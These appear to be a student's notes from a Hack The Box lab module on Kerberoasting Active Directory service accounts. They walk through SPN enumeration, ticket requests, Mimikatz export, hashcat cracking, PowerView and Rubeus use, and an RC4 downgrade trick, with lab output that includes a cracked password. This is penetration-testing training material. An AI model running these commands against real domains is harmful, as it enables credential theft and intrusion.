

## Semi Manual method

#### Enumerating SPNs with setspn.exe
```cmd-session
C:\htb> setspn.exe -Q */*
```
```cmd-session
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```
>>`Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`.`

#### Targeting a Single User

```powershell-session
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```


[^1]: Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):
	
	- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
	- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
	- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
	- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
	- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

#### Retrieving All Tickets Using setspn.exe
load into memory
```powershell-session
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extracting Tickets from Memory with Mimikatz

```cmd-session
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  
```
```cmd-session
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
RUZSRUlHSF==
```
-base64 retrieved
>If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.

---
#### Preparing the Base64 Blob for Cracking
```bash
AhmaDb0x@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
```

>We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi
```bash
AhmaDb0x@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

#### Extracting the Kerberos Ticket using kirbi2john.py
```bash
$ kirbi2john.py sqldev.kirbi
```
-This will create a file called `crack_file`.

#### Modifiying crack_file for Hashcat
```shell-session
AhmaDb0x@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

#### Viewing the Prepared Hash
CAT

#### Cracking the Hash with Hashcat
```bash
AhmaDb0x@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```
```shell-session
database!
```

#### alternative
If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

----
----
----


## Automated / Tool Based Route
#### Using PowerView to Extract TGS Tickets
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

#### Using PowerView to Target a Specific User

```powershell-session
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

#### Exporting All Tickets to a CSV File
```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```


#### Viewing the Contents of the .CSV File
cat

# Using Rubeus
```powershell-session
PS C:\htb> .\Rubeus.exe
```
```powershell-session
Roasting:
```


[^2]: - Performing Kerberoasting and outputting hashes to a file
	- Using alternate credentials
	- Performing Kerberoasting combined with a pass-the-ticket attack
	- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
	- Requesting tickets for accounts passwords set between a specific date range
	- Placing a limit on the number of tickets requested
	- Performing AES Kerberoasting


#### Using the /stats Flag

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats
```
```powershell-session
*] Total kerberoastable users : 9


 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

[^3]

[^3]: Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

---
#### Using the /nowrap Flag
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
```powershell-session
[*] Total kerberoastable users : 3
```

----

Kerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests.

`$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket.
AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`
which is hard to crack

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```powershell-session
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            0 testspn
```
`0 ===  the default of RC4_HMAC_MD5`
`24`, ===  `meaning that AES 128/256 encryption types are the only ones supported.`


---

Let's assume that our client has set SPN accounts to support AES 128/256 encryption.
```powershell-session
$krb5tgs$18$
```
use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table

use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

---

![image](https://academy.hackthebox.com/storage/modules/143/kerb_tgs_18.png)

$krb5tgs$23$*
the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.

```
This does not work against a Windows Server 2019 Domain Controller,
It will always return a service ticket encrypted with the highest level of encryption supported by the target account.
---
but before 2016 set aes encryption for account wont save downgrading


```



